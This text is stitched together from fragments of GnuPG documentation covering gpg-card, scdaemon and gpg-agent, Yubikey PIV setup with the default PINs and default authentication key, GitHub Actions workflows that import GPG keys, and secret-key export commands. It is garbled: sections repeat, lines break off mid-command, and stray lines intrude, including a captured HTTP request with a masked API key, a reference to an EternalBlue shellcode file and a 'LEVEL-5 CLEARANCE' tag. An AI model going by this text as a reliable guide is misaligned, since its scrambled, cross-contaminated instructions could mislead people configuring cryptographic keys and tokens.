+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key] AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref Write a certificate to the card under the id certref.

WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key —Shadowed

YUBIKEY cmd args ¶ Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp gpg/card> yubikey list Application USB NFC

OTP yes yes U2F yes yes OPGP no no PIV yes no OATH yes yes FIDO2 yes yes gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D —force

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

[...] Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: otto@example.net Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Email address: otto@example.net Comment: You selected this USER-ID: "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid otto@example.net $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save Now you can use your PIV card also with gpg.

 # 000006
/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
